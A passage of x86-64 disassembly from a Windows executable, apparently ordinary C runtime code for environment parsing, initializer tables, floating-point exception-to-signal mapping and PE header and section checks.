   1400032db:	85 c0                	test   %eax,%eax
   1400032dd:	75 ea                	jne    0x1400032c9
   1400032df:	48 8b 05 d2 4e 01 00 	mov    0x14ed2(%rip),%rax        # 0x1400181b8
   1400032e6:	48 89 05 e3 4e 01 00 	mov    %rax,0x14ee3(%rip)        # 0x1400181d0
   1400032ed:	48 83 c4 28          	add    $0x28,%rsp
   1400032f1:	c3                   	ret
   1400032f2:	cc                   	int3
   1400032f3:	cc                   	int3
   1400032f4:	48 83 ec 28          	sub    $0x28,%rsp
   1400032f8:	48 8b 05 b9 4e 01 00 	mov    0x14eb9(%rip),%rax        # 0x1400181b8
   1400032ff:	48 85 c0             	test   %rax,%rax
   140003302:	75 26                	jne    0x14000332a
   140003304:	48 39 05 b5 4e 01 00 	cmp    %rax,0x14eb5(%rip)        # 0x1400181c0
   14000330b:	75 04                	jne    0x140003311
   14000330d:	33 c0                	xor    %eax,%eax
   14000330f:	eb 19                	jmp    0x14000332a
   140003311:	e8 52 00 00 00       	call   0x140003368
   140003316:	85 c0                	test   %eax,%eax
   140003318:	74 09                	je     0x140003323
   14000331a:	e8 39 02 00 00       	call   0x140003558
   14000331f:	85 c0                	test   %eax,%eax
   140003321:	75 ea                	jne    0x14000330d
   140003323:	48 8b 05 8e 4e 01 00 	mov    0x14e8e(%rip),%rax        # 0x1400181b8
   14000332a:	48 83 c4 28          	add    $0x28,%rsp
   14000332e:	c3                   	ret
   14000332f:	cc                   	int3
   140003330:	48 83 ec 28          	sub    $0x28,%rsp
   140003334:	48 8d 0d 7d 4e 01 00 	lea    0x14e7d(%rip),%rcx        # 0x1400181b8
   14000333b:	e8 94 00 00 00       	call   0x1400033d4
   140003340:	48 8d 0d 79 4e 01 00 	lea    0x14e79(%rip),%rcx        # 0x1400181c0
   140003347:	e8 a4 00 00 00       	call   0x1400033f0
   14000334c:	48 8b 0d 7d 4e 01 00 	mov    0x14e7d(%rip),%rcx        # 0x1400181d0
   140003353:	e8 b4 00 00 00       	call   0x14000340c
   140003358:	48 8b 0d 69 4e 01 00 	mov    0x14e69(%rip),%rcx        # 0x1400181c8
   14000335f:	48 83 c4 28          	add    $0x28,%rsp
   140003363:	e9 a4 00 00 00       	jmp    0x14000340c
   140003368:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000336d:	57                   	push   %rdi
   14000336e:	48 83 ec 20          	sub    $0x20,%rsp
   140003372:	33 ff                	xor    %edi,%edi
   140003374:	48 39 3d 3d 4e 01 00 	cmp    %rdi,0x14e3d(%rip)        # 0x1400181b8
   14000337b:	74 04                	je     0x140003381
   14000337d:	33 c0                	xor    %eax,%eax
   14000337f:	eb 48                	jmp    0x1400033c9
   140003381:	e8 6e 19 00 00       	call   0x140004cf4
   140003386:	e8 a9 49 00 00       	call   0x140007d34
   14000338b:	48 8b d8             	mov    %rax,%rbx
   14000338e:	48 85 c0             	test   %rax,%rax
   140003391:	75 05                	jne    0x140003398
   140003393:	83 cf ff             	or     $0xffffffff,%edi
   140003396:	eb 27                	jmp    0x1400033bf
   140003398:	48 8b cb             	mov    %rbx,%rcx
   14000339b:	e8 b0 00 00 00       	call   0x140003450
   1400033a0:	48 85 c0             	test   %rax,%rax
   1400033a3:	75 05                	jne    0x1400033aa
   1400033a5:	83 cf ff             	or     $0xffffffff,%edi
   1400033a8:	eb 0e                	jmp    0x1400033b8
   1400033aa:	48 89 05 1f 4e 01 00 	mov    %rax,0x14e1f(%rip)        # 0x1400181d0
   1400033b1:	48 89 05 00 4e 01 00 	mov    %rax,0x14e00(%rip)        # 0x1400181b8
   1400033b8:	33 c9                	xor    %ecx,%ecx
   1400033ba:	e8 15 24 00 00       	call   0x1400057d4
   1400033bf:	48 8b cb             	mov    %rbx,%rcx
   1400033c2:	e8 0d 24 00 00       	call   0x1400057d4
   1400033c7:	8b c7                	mov    %edi,%eax
   1400033c9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400033ce:	48 83 c4 20          	add    $0x20,%rsp
   1400033d2:	5f                   	pop    %rdi
   1400033d3:	c3                   	ret
   1400033d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400033d8:	48 8b 09             	mov    (%rcx),%rcx
   1400033db:	48 3b 0d ee 4d 01 00 	cmp    0x14dee(%rip),%rcx        # 0x1400181d0
   1400033e2:	74 05                	je     0x1400033e9
   1400033e4:	e8 23 00 00 00       	call   0x14000340c
   1400033e9:	48 83 c4 28          	add    $0x28,%rsp
   1400033ed:	c3                   	ret
   1400033ee:	cc                   	int3
   1400033ef:	cc                   	int3
   1400033f0:	48 83 ec 28          	sub    $0x28,%rsp
   1400033f4:	48 8b 09             	mov    (%rcx),%rcx
   1400033f7:	48 3b 0d ca 4d 01 00 	cmp    0x14dca(%rip),%rcx        # 0x1400181c8
   1400033fe:	74 05                	je     0x140003405
   140003400:	e8 07 00 00 00       	call   0x14000340c
   140003405:	48 83 c4 28          	add    $0x28,%rsp
   140003409:	c3                   	ret
   14000340a:	cc                   	int3
   14000340b:	cc                   	int3
   14000340c:	48 85 c9             	test   %rcx,%rcx
   14000340f:	74 3b                	je     0x14000344c
   140003411:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003416:	57                   	push   %rdi
   140003417:	48 83 ec 20          	sub    $0x20,%rsp
   14000341b:	48 8b 01             	mov    (%rcx),%rax
   14000341e:	48 8b d9             	mov    %rcx,%rbx
   140003421:	48 8b f9             	mov    %rcx,%rdi
   140003424:	eb 0f                	jmp    0x140003435
   140003426:	48 8b c8             	mov    %rax,%rcx
   140003429:	e8 a6 23 00 00       	call   0x1400057d4
   14000342e:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140003432:	48 8b 07             	mov    (%rdi),%rax
   140003435:	48 85 c0             	test   %rax,%rax
   140003438:	75 ec                	jne    0x140003426
   14000343a:	48 8b cb             	mov    %rbx,%rcx
   14000343d:	e8 92 23 00 00       	call   0x1400057d4
   140003442:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003447:	48 83 c4 20          	add    $0x20,%rsp
   14000344b:	5f                   	pop    %rdi
   14000344c:	c3                   	ret
   14000344d:	cc                   	int3
   14000344e:	cc                   	int3
   14000344f:	cc                   	int3
   140003450:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003455:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000345a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000345f:	57                   	push   %rdi
   140003460:	41 56                	push   %r14
   140003462:	41 57                	push   %r15
   140003464:	48 83 ec 30          	sub    $0x30,%rsp
   140003468:	4c 8b f1             	mov    %rcx,%r14
   14000346b:	33 f6                	xor    %esi,%esi
   14000346d:	8b ce                	mov    %esi,%ecx
   14000346f:	4d 8b c6             	mov    %r14,%r8
   140003472:	41 8a 16             	mov    (%r14),%dl
   140003475:	eb 24                	jmp    0x14000349b
   140003477:	80 fa 3d             	cmp    $0x3d,%dl
   14000347a:	48 8d 41 01          	lea    0x1(%rcx),%rax
   14000347e:	48 0f 44 c1          	cmove  %rcx,%rax
   140003482:	48 8b c8             	mov    %rax,%rcx
   140003485:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003489:	48 ff c0             	inc    %rax
   14000348c:	41 38 34 00          	cmp    %sil,(%r8,%rax,1)
   140003490:	75 f7                	jne    0x140003489
   140003492:	49 ff c0             	inc    %r8
   140003495:	4c 03 c0             	add    %rax,%r8
   140003498:	41 8a 10             	mov    (%r8),%dl
   14000349b:	84 d2                	test   %dl,%dl
   14000349d:	75 d8                	jne    0x140003477
   14000349f:	48 ff c1             	inc    %rcx
   1400034a2:	ba 08 00 00 00       	mov    $0x8,%edx
   1400034a7:	e8 6c 32 00 00       	call   0x140006718
   1400034ac:	48 8b d8             	mov    %rax,%rbx
   1400034af:	48 85 c0             	test   %rax,%rax
   1400034b2:	74 6c                	je     0x140003520
   1400034b4:	4c 8b f8             	mov    %rax,%r15
   1400034b7:	41 8a 06             	mov    (%r14),%al
   1400034ba:	84 c0                	test   %al,%al
   1400034bc:	74 5f                	je     0x14000351d
   1400034be:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400034c2:	48 ff c5             	inc    %rbp
   1400034c5:	41 38 34 2e          	cmp    %sil,(%r14,%rbp,1)
   1400034c9:	75 f7                	jne    0x1400034c2
   1400034cb:	48 ff c5             	inc    %rbp
   1400034ce:	3c 3d                	cmp    $0x3d,%al
   1400034d0:	74 35                	je     0x140003507
   1400034d2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400034d7:	48 8b cd             	mov    %rbp,%rcx
   1400034da:	e8 39 32 00 00       	call   0x140006718
   1400034df:	48 8b f8             	mov    %rax,%rdi
   1400034e2:	48 85 c0             	test   %rax,%rax
   1400034e5:	74 25                	je     0x14000350c
   1400034e7:	4d 8b c6             	mov    %r14,%r8
   1400034ea:	48 8b d5             	mov    %rbp,%rdx
   1400034ed:	48 8b c8             	mov    %rax,%rcx
   1400034f0:	e8 2b 07 00 00       	call   0x140003c20
   1400034f5:	33 c9                	xor    %ecx,%ecx
   1400034f7:	85 c0                	test   %eax,%eax
   1400034f9:	75 48                	jne    0x140003543
   1400034fb:	49 89 3f             	mov    %rdi,(%r15)
   1400034fe:	49 83 c7 08          	add    $0x8,%r15
   140003502:	e8 cd 22 00 00       	call   0x1400057d4
   140003507:	4c 03 f5             	add    %rbp,%r14
   14000350a:	eb ab                	jmp    0x1400034b7
   14000350c:	48 8b cb             	mov    %rbx,%rcx
   14000350f:	e8 f8 fe ff ff       	call   0x14000340c
   140003514:	33 c9                	xor    %ecx,%ecx
   140003516:	e8 b9 22 00 00       	call   0x1400057d4
   14000351b:	eb 03                	jmp    0x140003520
   14000351d:	48 8b f3             	mov    %rbx,%rsi
   140003520:	33 c9                	xor    %ecx,%ecx
   140003522:	e8 ad 22 00 00       	call   0x1400057d4
   140003527:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000352c:	48 8b c6             	mov    %rsi,%rax
   14000352f:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140003534:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140003539:	48 83 c4 30          	add    $0x30,%rsp
   14000353d:	41 5f                	pop    %r15
   14000353f:	41 5e                	pop    %r14
   140003541:	5f                   	pop    %rdi
   140003542:	c3                   	ret
   140003543:	45 33 c9             	xor    %r9d,%r9d
   140003546:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000354b:	45 33 c0             	xor    %r8d,%r8d
   14000354e:	33 d2                	xor    %edx,%edx
   140003550:	e8 9b 23 00 00       	call   0x1400058f0
   140003555:	cc                   	int3
   140003556:	cc                   	int3
   140003557:	cc                   	int3
   140003558:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000355d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140003562:	57                   	push   %rdi
   140003563:	48 83 ec 40          	sub    $0x40,%rsp
   140003567:	48 8b 3d 52 4c 01 00 	mov    0x14c52(%rip),%rdi        # 0x1400181c0
   14000356e:	48 85 ff             	test   %rdi,%rdi
   140003571:	0f 85 94 00 00 00    	jne    0x14000360b
   140003577:	83 c8 ff             	or     $0xffffffff,%eax
   14000357a:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000357f:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140003584:	48 83 c4 40          	add    $0x40,%rsp
   140003588:	5f                   	pop    %rdi
   140003589:	c3                   	ret
   14000358a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140003590:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140003594:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   14000359a:	4c 8b c0             	mov    %rax,%r8
   14000359d:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   1400035a2:	33 d2                	xor    %edx,%edx
   1400035a4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400035aa:	33 c9                	xor    %ecx,%ecx
   1400035ac:	e8 d3 46 00 00       	call   0x140007c84
   1400035b1:	48 63 f0             	movslq %eax,%rsi
   1400035b4:	85 c0                	test   %eax,%eax
   1400035b6:	74 bf                	je     0x140003577
   1400035b8:	ba 01 00 00 00       	mov    $0x1,%edx
   1400035bd:	48 8b ce             	mov    %rsi,%rcx
   1400035c0:	e8 53 31 00 00       	call   0x140006718
   1400035c5:	48 8b d8             	mov    %rax,%rbx
   1400035c8:	48 85 c0             	test   %rax,%rax
   1400035cb:	74 4f                	je     0x14000361c
   1400035cd:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   1400035d3:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1400035d7:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   1400035dd:	33 d2                	xor    %edx,%edx
   1400035df:	4c 8b 07             	mov    (%rdi),%r8
   1400035e2:	33 c9                	xor    %ecx,%ecx
   1400035e4:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400035e8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400035ed:	e8 92 46 00 00       	call   0x140007c84
   1400035f2:	85 c0                	test   %eax,%eax
   1400035f4:	74 26                	je     0x14000361c
   1400035f6:	33 d2                	xor    %edx,%edx
   1400035f8:	48 8b cb             	mov    %rbx,%rcx
   1400035fb:	e8 38 48 00 00       	call   0x140007e38
   140003600:	33 c9                	xor    %ecx,%ecx
   140003602:	e8 cd 21 00 00       	call   0x1400057d4
   140003607:	48 83 c7 08          	add    $0x8,%rdi
   14000360b:	48 8b 07             	mov    (%rdi),%rax
   14000360e:	48 85 c0             	test   %rax,%rax
   140003611:	0f 85 73 ff ff ff    	jne    0x14000358a
   140003617:	e9 5e ff ff ff       	jmp    0x14000357a
   14000361c:	48 8b cb             	mov    %rbx,%rcx
   14000361f:	e8 b0 21 00 00       	call   0x1400057d4
   140003624:	e9 4e ff ff ff       	jmp    0x140003577
   140003629:	cc                   	int3
   14000362a:	cc                   	int3
   14000362b:	cc                   	int3
   14000362c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003631:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003636:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000363b:	57                   	push   %rdi
   14000363c:	48 83 ec 20          	sub    $0x20,%rsp
   140003640:	33 ed                	xor    %ebp,%ebp
   140003642:	48 8b fa             	mov    %rdx,%rdi
   140003645:	48 2b f9             	sub    %rcx,%rdi
   140003648:	48 8b d9             	mov    %rcx,%rbx
   14000364b:	48 83 c7 07          	add    $0x7,%rdi
   14000364f:	8b f5                	mov    %ebp,%esi
   140003651:	48 c1 ef 03          	shr    $0x3,%rdi
   140003655:	48 3b ca             	cmp    %rdx,%rcx
   140003658:	48 0f 47 fd          	cmova  %rbp,%rdi
   14000365c:	48 85 ff             	test   %rdi,%rdi
   14000365f:	74 1a                	je     0x14000367b
   140003661:	48 8b 03             	mov    (%rbx),%rax
   140003664:	48 85 c0             	test   %rax,%rax
   140003667:	74 06                	je     0x14000366f
   140003669:	ff 15 a1 69 01 00    	call   *0x169a1(%rip)        # 0x14001a010
   14000366f:	48 83 c3 08          	add    $0x8,%rbx
   140003673:	48 ff c6             	inc    %rsi
   140003676:	48 3b f7             	cmp    %rdi,%rsi
   140003679:	75 e6                	jne    0x140003661
   14000367b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003680:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003685:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000368a:	48 83 c4 20          	add    $0x20,%rsp
   14000368e:	5f                   	pop    %rdi
   14000368f:	c3                   	ret
   140003690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003695:	57                   	push   %rdi
   140003696:	48 83 ec 20          	sub    $0x20,%rsp
   14000369a:	48 8b fa             	mov    %rdx,%rdi
   14000369d:	48 8b d9             	mov    %rcx,%rbx
   1400036a0:	48 3b ca             	cmp    %rdx,%rcx
   1400036a3:	74 1b                	je     0x1400036c0
   1400036a5:	48 8b 03             	mov    (%rbx),%rax
   1400036a8:	48 85 c0             	test   %rax,%rax
   1400036ab:	74 0a                	je     0x1400036b7
   1400036ad:	ff 15 5d 69 01 00    	call   *0x1695d(%rip)        # 0x14001a010
   1400036b3:	85 c0                	test   %eax,%eax
   1400036b5:	75 0b                	jne    0x1400036c2
   1400036b7:	48 83 c3 08          	add    $0x8,%rbx
   1400036bb:	48 3b df             	cmp    %rdi,%rbx
   1400036be:	eb e3                	jmp    0x1400036a3
   1400036c0:	33 c0                	xor    %eax,%eax
   1400036c2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036c7:	48 83 c4 20          	add    $0x20,%rsp
   1400036cb:	5f                   	pop    %rdi
   1400036cc:	c3                   	ret
   1400036cd:	cc                   	int3
   1400036ce:	cc                   	int3
   1400036cf:	cc                   	int3
   1400036d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400036d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400036da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400036df:	57                   	push   %rdi
   1400036e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400036e4:	48 8b f2             	mov    %rdx,%rsi
   1400036e7:	8b f9                	mov    %ecx,%edi
   1400036e9:	e8 2e 0f 00 00       	call   0x14000461c
   1400036ee:	45 33 c9             	xor    %r9d,%r9d
   1400036f1:	48 8b d8             	mov    %rax,%rbx
   1400036f4:	48 85 c0             	test   %rax,%rax
   1400036f7:	0f 84 3e 01 00 00    	je     0x14000383b
   1400036fd:	48 8b 08             	mov    (%rax),%rcx
   140003700:	48 8b c1             	mov    %rcx,%rax
   140003703:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   14000370a:	49 3b c8             	cmp    %r8,%rcx
   14000370d:	74 0d                	je     0x14000371c
   14000370f:	39 38                	cmp    %edi,(%rax)
   140003711:	74 0c                	je     0x14000371f
   140003713:	48 83 c0 10          	add    $0x10,%rax
   140003717:	49 3b c0             	cmp    %r8,%rax
   14000371a:	75 f3                	jne    0x14000370f
   14000371c:	49 8b c1             	mov    %r9,%rax
   14000371f:	48 85 c0             	test   %rax,%rax
   140003722:	0f 84 13 01 00 00    	je     0x14000383b
   140003728:	4c 8b 40 08          	mov    0x8(%rax),%r8
   14000372c:	4d 85 c0             	test   %r8,%r8
   14000372f:	0f 84 06 01 00 00    	je     0x14000383b
   140003735:	49 83 f8 05          	cmp    $0x5,%r8
   140003739:	75 0d                	jne    0x140003748
   14000373b:	4c 89 48 08          	mov    %r9,0x8(%rax)
   14000373f:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   140003743:	e9 f5 00 00 00       	jmp    0x14000383d
   140003748:	49 83 f8 01          	cmp    $0x1,%r8
   14000374c:	75 08                	jne    0x140003756
   14000374e:	83 c8 ff             	or     $0xffffffff,%eax
   140003751:	e9 e7 00 00 00       	jmp    0x14000383d
   140003756:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   14000375a:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   14000375e:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   140003762:	0f 85 ba 00 00 00    	jne    0x140003822
   140003768:	48 83 c1 30          	add    $0x30,%rcx
   14000376c:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   140003773:	eb 08                	jmp    0x14000377d
   140003775:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   140003779:	48 83 c1 10          	add    $0x10,%rcx
   14000377d:	48 3b ca             	cmp    %rdx,%rcx
   140003780:	75 f3                	jne    0x140003775
   140003782:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   140003788:	8b 7b 10             	mov    0x10(%rbx),%edi
   14000378b:	74 7a                	je     0x140003807
   14000378d:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   140003793:	74 6b                	je     0x140003800
   140003795:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   14000379b:	74 5c                	je     0x1400037f9
   14000379d:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   1400037a3:	74 4d                	je     0x1400037f2
   1400037a5:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   1400037ab:	74 3e                	je     0x1400037eb
   1400037ad:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   1400037b3:	74 2f                	je     0x1400037e4
   1400037b5:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   1400037bb:	74 20                	je     0x1400037dd
   1400037bd:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1400037c3:	74 11                	je     0x1400037d6
   1400037c5:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   1400037cb:	8b d7                	mov    %edi,%edx
   1400037cd:	75 40                	jne    0x14000380f
   1400037cf:	ba 8d 00 00 00       	mov    $0x8d,%edx
   1400037d4:	eb 36                	jmp    0x14000380c
   1400037d6:	ba 8e 00 00 00       	mov    $0x8e,%edx
   1400037db:	eb 2f                	jmp    0x14000380c
   1400037dd:	ba 85 00 00 00       	mov    $0x85,%edx
   1400037e2:	eb 28                	jmp    0x14000380c
   1400037e4:	ba 8a 00 00 00       	mov    $0x8a,%edx
   1400037e9:	eb 21                	jmp    0x14000380c
   1400037eb:	ba 84 00 00 00       	mov    $0x84,%edx
   1400037f0:	eb 1a                	jmp    0x14000380c
   1400037f2:	ba 81 00 00 00       	mov    $0x81,%edx
   1400037f7:	eb 13                	jmp    0x14000380c
   1400037f9:	ba 86 00 00 00       	mov    $0x86,%edx
   1400037fe:	eb 0c                	jmp    0x14000380c
   140003800:	ba 83 00 00 00       	mov    $0x83,%edx
   140003805:	eb 05                	jmp    0x14000380c
   140003807:	ba 82 00 00 00       	mov    $0x82,%edx
   14000380c:	89 53 10             	mov    %edx,0x10(%rbx)
   14000380f:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003814:	49 8b c0             	mov    %r8,%rax
   140003817:	ff 15 f3 67 01 00    	call   *0x167f3(%rip)        # 0x14001a010
   14000381d:	89 7b 10             	mov    %edi,0x10(%rbx)
   140003820:	eb 10                	jmp    0x140003832
   140003822:	8b 48 04             	mov    0x4(%rax),%ecx
   140003825:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140003829:	49 8b c0             	mov    %r8,%rax
   14000382c:	ff 15 de 67 01 00    	call   *0x167de(%rip)        # 0x14001a010
   140003832:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140003836:	e9 13 ff ff ff       	jmp    0x14000374e
   14000383b:	33 c0                	xor    %eax,%eax
   14000383d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003842:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003847:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000384c:	48 83 c4 20          	add    $0x20,%rsp
   140003850:	5f                   	pop    %rdi
   140003851:	c3                   	ret
   140003852:	cc                   	int3
   140003853:	cc                   	int3
   140003854:	8b 05 7e 49 01 00    	mov    0x1497e(%rip),%eax        # 0x1400181d8
   14000385a:	c3                   	ret
   14000385b:	cc                   	int3
   14000385c:	89 0d 76 49 01 00    	mov    %ecx,0x14976(%rip)        # 0x1400181d8
   140003862:	c3                   	ret
   140003863:	cc                   	int3
   140003864:	48 83 ec 28          	sub    $0x28,%rsp
   140003868:	8d 81 00 c0 ff ff    	lea    -0x4000(%rcx),%eax
   14000386e:	a9 ff 3f ff ff       	test   $0xffff3fff,%eax
   140003873:	75 12                	jne    0x140003887
   140003875:	81 f9 00 c0 00 00    	cmp    $0xc000,%ecx
   14000387b:	74 0a                	je     0x140003887
   14000387d:	87 0d f5 52 01 00    	xchg   %ecx,0x152f5(%rip)        # 0x140018b78
   140003883:	33 c0                	xor    %eax,%eax
   140003885:	eb 15                	jmp    0x14000389c
   140003887:	e8 70 2a 00 00       	call   0x1400062fc
   14000388c:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140003892:	e8 39 20 00 00       	call   0x1400058d0
   140003897:	b8 16 00 00 00       	mov    $0x16,%eax
   14000389c:	48 83 c4 28          	add    $0x28,%rsp
   1400038a0:	c3                   	ret
   1400038a1:	cc                   	int3
   1400038a2:	cc                   	int3
   1400038a3:	cc                   	int3
   1400038a4:	8b 05 32 49 01 00    	mov    0x14932(%rip),%eax        # 0x1400181dc
   1400038aa:	c3                   	ret
   1400038ab:	cc                   	int3
   1400038ac:	48 83 ec 28          	sub    $0x28,%rsp
   1400038b0:	83 f9 01             	cmp    $0x1,%ecx
   1400038b3:	76 15                	jbe    0x1400038ca
   1400038b5:	e8 42 2a 00 00       	call   0x1400062fc
   1400038ba:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400038c0:	e8 0b 20 00 00       	call   0x1400058d0
   1400038c5:	83 c8 ff             	or     $0xffffffff,%eax
   1400038c8:	eb 08                	jmp    0x1400038d2
   1400038ca:	87 0d 0c 49 01 00    	xchg   %ecx,0x1490c(%rip)        # 0x1400181dc
   1400038d0:	8b c1                	mov    %ecx,%eax
   1400038d2:	48 83 c4 28          	add    $0x28,%rsp
   1400038d6:	c3                   	ret
   1400038d7:	cc                   	int3
   1400038d8:	48 83 ec 28          	sub    $0x28,%rsp
   1400038dc:	e8 bf 0b 00 00       	call   0x1400044a0
   1400038e1:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400038e5:	48 85 c0             	test   %rax,%rax
   1400038e8:	74 08                	je     0x1400038f2
   1400038ea:	ff 15 20 67 01 00    	call   *0x16720(%rip)        # 0x14001a010
   1400038f0:	eb 00                	jmp    0x1400038f2
   1400038f2:	e8 55 01 00 00       	call   0x140003a4c
   1400038f7:	90                   	nop
   1400038f8:	cc                   	int3
   1400038f9:	cc                   	int3
   1400038fa:	cc                   	int3
   1400038fb:	cc                   	int3
   1400038fc:	cc                   	int3
   1400038fd:	cc                   	int3
   1400038fe:	cc                   	int3
   1400038ff:	cc                   	int3
   140003900:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140003905:	66 39 01             	cmp    %ax,(%rcx)
   140003908:	75 20                	jne    0x14000392a
   14000390a:	48 63 41 3c          	movslq 0x3c(%rcx),%rax
   14000390e:	48 03 c1             	add    %rcx,%rax
   140003911:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140003917:	75 11                	jne    0x14000392a
   140003919:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   14000391e:	66 39 48 18          	cmp    %cx,0x18(%rax)
   140003922:	75 06                	jne    0x14000392a
   140003924:	b8 01 00 00 00       	mov    $0x1,%eax
   140003929:	c3                   	ret
   14000392a:	33 c0                	xor    %eax,%eax
   14000392c:	c3                   	ret
   14000392d:	cc                   	int3
   14000392e:	cc                   	int3
   14000392f:	cc                   	int3
   140003930:	4c 63 41 3c          	movslq 0x3c(%rcx),%r8
   140003934:	45 33 c9             	xor    %r9d,%r9d
   140003937:	4c 03 c1             	add    %rcx,%r8
   14000393a:	4c 8b d2             	mov    %rdx,%r10
   14000393d:	41 0f b7 40 14       	movzwl 0x14(%r8),%eax
   140003942:	45 0f b7 58 06       	movzwl 0x6(%r8),%r11d
   140003947:	48 83 c0 18          	add    $0x18,%rax
   14000394b:	49 03 c0             	add    %r8,%rax
   14000394e:	45 85 db             	test   %r11d,%r11d
   140003951:	74 1e                	je     0x140003971
   140003953:	8b 50 0c             	mov    0xc(%rax),%edx
   140003956:	4c 3b d2             	cmp    %rdx,%r10
   140003959:	72 0a                	jb     0x140003965
   14000395b:	8b 48 08             	mov    0x8(%rax),%ecx
   14000395e:	03 ca                	add    %edx,%ecx
   140003960:	4c 3b d1             	cmp    %rcx,%r10
   140003963:	72 0e                	jb     0x140003973
   140003965:	41 ff c1             	inc    %r9d
   140003968:	48 83 c0 28          	add    $0x28,%rax
   14000396c:	45 3b cb             	cmp    %r11d,%r9d
   14000396f:	72 e2                	jb     0x140003953
   140003971:	33 c0                	xor    %eax,%eax
   140003973:	c3                   	ret
   140003974:	cc                   	int3
   140003975:	cc                   	int3
   140003976:	cc                   	int3
   140003977:	cc                   	int3
   140003978:	cc                   	int3
   140003979:	cc                   	int3
   14000397a:	cc                   	int3
   14000397b:	cc                   	int3
   14000397c:	cc                   	int3
   14000397d:	cc                   	int3
   14000397e:	cc                   	int3
   14000397f:	cc                   	int3
   140003980:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003985:	57                   	push   %rdi
   140003986:	48 83 ec 20          	sub    $0x20,%rsp
   14000398a:	48 8b d9             	mov    %rcx,%rbx
   14000398d:	48 8d 3d 6c c6 ff ff 	lea    -0x3994(%rip),%rdi        # 0x140000000
   140003994:	48 8b cf             	mov    %rdi,%rcx
   140003997:	e8 64 ff ff ff       	call   0x140003900
   14000399c:	85 c0                	test   %eax,%eax
   14000399e:	74 22                	je     0x1400039c2
   1400039a0:	48 2b df             	sub    %rdi,%rbx
   1400039a3:	48 8b d3             	mov    %rbx,%rdx
   1400039a6:	48 8b cf             	mov    %rdi,%rcx
   1400039a9:	e8 82 ff ff ff       	call   0x140003930
   1400039ae:	48 85 c0             	test   %rax,%rax
   1400039b1:	74 0f                	je     0x1400039c2
   1400039b3:	8b 40 24             	mov    0x24(%rax),%eax
   1400039b6:	c1 e8 1f             	shr    $0x1f,%eax
   1400039b9:	f7 d0                	not    %eax
   1400039bb:	83 e0 01             	and    $0x1,%eax
   1400039be:	eb 02                	jmp    0x1400039c2
   1400039c0:	33 c0                	xor    %eax,%eax
   1400039c2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
